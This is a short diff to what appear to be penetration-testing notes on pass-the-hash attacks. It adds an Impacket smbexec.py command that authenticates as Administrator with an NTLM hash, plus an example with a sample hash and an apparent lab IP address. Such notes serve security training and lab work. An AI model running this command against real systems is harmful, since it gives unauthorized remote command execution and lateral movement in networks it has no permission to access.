@@ -108,6 +108,13 @@ Download from:  [https://github.com/SecureAuthCorp/impacket/blob/master/examples
 
 Download from: [https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)
 
+```bash
+python3 smbexec.py -hashes :$NTLMhash Administrator@<TARGET-IP>
+
+# Example:
+python3 smbexec.py -hashes :bac9dc5b7b4bec1d83e0e9c04b477f26 Administrator@10.129.138.81
+```
+
 
 ## Pass the Hash with CrackMapExec (Linux)
 
